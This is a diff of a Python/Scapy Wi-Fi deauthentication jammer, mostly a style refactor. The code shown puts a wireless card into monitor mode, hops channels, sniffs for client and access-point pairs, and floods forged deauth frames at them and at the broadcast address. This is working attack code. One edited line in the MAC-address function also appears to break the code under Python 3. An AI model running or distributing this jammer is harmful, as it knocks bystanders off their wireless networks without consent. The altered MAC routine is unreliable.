@@ -13,6 +13,7 @@ import sys
 import os
 from scapy.all import *
 import logging
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up Scapy
 conf.verb = 0  # Scapy I thought I told you to shut up
 
@@ -26,6 +27,7 @@ P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 T = '\033[93m'  # tan
+
 
 
 def parse_args():
@@ -112,7 +114,7 @@ def get_mon_iface(args):
         return monitors[0]
     else:
         # Start monitor mode on a wireless interface
-        print('['+G+'*'+W+'] Finding the most powerful interface...')
+        print('[' + G + '*' + W + '] Finding the most powerful interface...')
         os.system('pkill NetworkManager')
         interface = get_iface(interfaces)
         monmode = start_mon_mode(interface)
@@ -125,7 +127,7 @@ def iwconfig():
     try:
         proc = Popen(['iwconfig'], stdout=PIPE, stderr=PIPE)
     except OSError:
-        sys.exit('['+R+'-'+W+'] Could not execute "iwconfig"')
+        sys.exit('[' + R + '-' + W + '] Could not execute "iwconfig"')
     for line in proc.communicate()[0].decode().split('\n'):
         if len(line) == 0:
             continue  # Isn't an empty string
@@ -148,7 +150,7 @@ def get_iface(interfaces):
 
     if len(interfaces) < 1:
         sys.exit(
-            '['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
+            '[' + R + '-' + W + '] No wireless interfaces found, bring one up and try again')
     if len(interfaces) == 1:
         for interface in interfaces:
             return interface
@@ -161,28 +163,28 @@ def get_iface(interfaces):
             if ' - Address:' in line:  # first line in iwlist scan for a new AP
                 count += 1
         scanned_aps.append((count, iface))
-        print('['+G+'+'+W+'] Networks discovered by ' +
-              G+iface+W+': '+T+str(count)+W)
+        print('[' + G + '+' + W + '] Networks discovered by ' +
+              G + iface + W + ': ' + T + str(count) + W)
     try:
         interface = max(scanned_aps)[1]
         return interface
     except Exception as e:
         for iface in interfaces:
             interface = iface
-            print('['+R+'-'+W+'] Minor error:', e)
-            print('    Starting monitor mode on '+G+interface+W)
+            print('[' + R + '-' + W + '] Minor error:', e)
+            print('    Starting monitor mode on ' + G + interface + W)
             return interface
 
 
 def start_mon_mode(interface):
-    print('['+G+'+'+W+'] Starting monitor mode off '+G+interface+W)
+    print('[' + G + '+' + W + '] Starting monitor mode off ' + G + interface + W)
     try:
         os.system('ip link set %s down' % interface)
         os.system('iwconfig %s mode monitor' % interface)
         os.system('ip link set %s up' % interface)
         return interface
     except Exception:
-        sys.exit('['+R+'-'+W+'] Could not start monitor mode')
+        sys.exit('[' + R + '-' + W + '] Could not start monitor mode')
 
 
 def remove_mon_iface(mon_iface):
@@ -192,14 +194,15 @@ def remove_mon_iface(mon_iface):
 
 
 def mon_mac(mon_iface):
-    '''
+    """
     http://stackoverflow.com/questions/159137/getting-mac-address
-    '''
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', bytes(mon_iface, 'utf-8')[:15]))
-    mac = ':'.join('%02x' % b for b in info[18:24])
-    print('['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W)
+    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', bytes(mon_iface).encode('utf-8')[:15]))
+    mac = ':'.join('%02x' % ord(b) for b in info[18:24])
+    print('[' + G + '*' + W + '] Monitor mode: ' + G + mon_iface + W + ' - ' + O + mac + W)
     return mac
+
 
 ########################################
 # End of interface info and manipulation
@@ -207,39 +210,39 @@ def mon_mac(mon_iface):
 
 
 def channel_hop(mon_iface, args):
-    '''
+    """
     First time it runs through the channels it stays on each channel for 5 seconds
     in order to populate the deauth list nicely. After that it goes as fast as it can
-    '''
+    """
     global monchannel, first_pass
 
-    channelNum = 0
-    maxChan = 11 if not args.world else 13
+    channel_num = 0
+    max_chan = 11 if not args.world else 13
     err = None
 
-    while 1:
+    while True:
         if args.channel:
             with lock:
                 monchannel = args.channel
         else:
-            channelNum += 1
-            if channelNum > maxChan:
-                channelNum = 1
+            channel_num += 1
+            if channel_num > max_chan:
+                channel_num = 1
                 with lock:
                     first_pass = 0
             with lock:
-                monchannel = str(channelNum)
+                monchannel = str(channel_num)
 
             try:
                 proc = Popen(['iw', 'dev', mon_iface, 'set',
-                             'channel', monchannel], stdout=DN, stderr=PIPE)
+                              'channel', monchannel], stdout=DN, stderr=PIPE)
             except OSError:
-                print('['+R+'-'+W+'] Could not execute "iw"')
+                print('[' + R + '-' + W + '] Could not execute "iw"')
                 os.kill(os.getpid(), SIGINT)
                 sys.exit(1)
             for line in proc.communicate()[1].split('\n'):
                 if len(line) > 2:  # iw dev shouldnt display output unless there's an error
-                    err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W
+                    err = '[' + R + '-' + W + '] Channel hopping failed: ' + R + line + W
 
         output(err, monchannel)
         if args.channel:
@@ -254,11 +257,11 @@ def channel_hop(mon_iface, args):
 
 
 def deauth(monchannel):
-    '''
+    """
     addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
     multi-APs to one gateway. Constantly scans the clients_APs list and
     starts a thread to deauth each instance
-    '''
+    """
     pkts = []
 
     if len(clients_APs) > 0:
@@ -273,9 +276,9 @@ def deauth(monchannel):
                 # type=0, subtype=12?
                 if ch == monchannel:
                     deauth_pkt1 = Dot11(
-                        addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
+                        addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
                     deauth_pkt2 = Dot11(
-                        addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
+                        addr1=ap, addr2=client, addr3=client) / Dot11Deauth()
                     pkts.append(deauth_pkt1)
                     pkts.append(deauth_pkt2)
     if len(APs) > 0:
@@ -286,7 +289,7 @@ def deauth(monchannel):
                     ch = a[1]
                     if ch == monchannel:
                         deauth_ap = Dot11(
-                            addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
+                            addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap) / Dot11Deauth()
                         pkts.append(deauth_ap)
 
     if len(pkts) > 0:
@@ -303,27 +306,27 @@ def deauth(monchannel):
 def output(err, monchannel):
     os.system('clear')
     if args.dry_run:
-        print(P+'***DRY-RUN***'+W)
+        print(P + '***DRY-RUN***' + W)
     if err:
         print(err)
     else:
-        print('['+G+'+'+W+'] '+mon_iface+' channel: '+G+monchannel+W+'\n')
+        print('[' + G + '+' + W + '] ' + mon_iface + ' channel: ' + G + monchannel + W + '\n')
     if len(clients_APs) > 0:
         print('                  Deauthing                 ch   ESSID')
     # Print the deauth list
     with lock:
         for ca in clients_APs:
             if len(ca) > 3:
-                print('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1] +
-                      W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W)
+                print('[' + T + '*' + W + '] ' + O + ca[0] + W + ' - ' + O + ca[1] +
+                      W + ' - ' + ca[2].ljust(2) + ' - ' + T + ca[3] + W)
             else:
-                print('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2])
+                print('[' + T + '*' + W + '] ' + O + ca[0] + W + ' - ' + O + ca[1] + W + ' - ' + ca[2])
     if len(APs) > 0:
         print('\n      Access Points     ch   ESSID')
     with lock:
         for ap in APs:
-            print('['+T+'*'+W+'] '+O+ap[0]+W+' - ' +
-                  ap[1].ljust(2)+' - '+T+ap[2]+W)
+            print('[' + T + '*' + W + '] ' + O + ap[0] + W + ' - ' +
+                  ap[1].ljust(2) + ' - ' + T + ap[2] + W)
     print('')
 
 
@@ -339,11 +342,11 @@ def noise_filter(skip, addr1, addr2):
 
 
 def cb(pkt):
-    '''
+    """
     Look for dot11 packets that aren't to or from broadcast address,
     are type 1 or 2 (control, data), and append the addr1 and addr2
     to the list of deauth targets.
-    '''
+    """
     global clients_APs, APs
 
     # return these if's keeping clients_APs the same or just reset clients_APs?
@@ -368,7 +371,8 @@ def cb(pkt):
             # Filter out all other APs and clients if asked
             if args.accesspoint:
                 # track bssid for essid
-                if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt[Dot11Elt].info in args.accesspoint:
+                if ((pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt[Dot11Elt].info
+                        in args.accesspoint):
                     args.accesspoint.add(pkt[Dot11].addr3.lower())
                 # bail if bssid is not in target list
                 if not args.accesspoint.intersection([pkt.addr1.lower(), pkt.addr2.lower()]):
@@ -452,18 +456,18 @@ def AP_check(addr1, addr2):
 
 def stop(signal, frame):
     if monitor_on:
-        os.system('service network-manager restart')
-        sys.exit('\n['+R+'!'+W+'] Closing')
+        os.system('service NetworkManager restart')
+        sys.exit('\n[' + R + '!' + W + '] Closing')
     else:
         remove_mon_iface(mon_iface)
-        os.system('service network-manager restart')
-        sys.exit('\n['+R+'!'+W+'] Closing')
+        os.system('service NetworkManager restart')
+        sys.exit('\n[' + R + '!' + W + '] Closing')
 
 
 if __name__ == "__main__":
     args = parse_args()
     if os.geteuid():
-        sys.exit('['+R+'-'+W+'] Please run as root')
+        sys.exit('[' + R + '-' + W + '] Please run as root')
     clients_APs = []
     APs = []
     DN = open(os.devnull, 'w')
@@ -489,6 +493,6 @@ if __name__ == "__main__":
         sniff(iface=mon_iface, store=0, prn=cb)
     except Exception as msg:
         remove_mon_iface(mon_iface)
-        os.system('service network-manager restart')
-        print('\n['+R+'!'+W+'] Closing')
+        os.system('service NetworkManager restart')
+        print('\n[' + R + '!' + W + '] Closing')
         sys.exit(0)
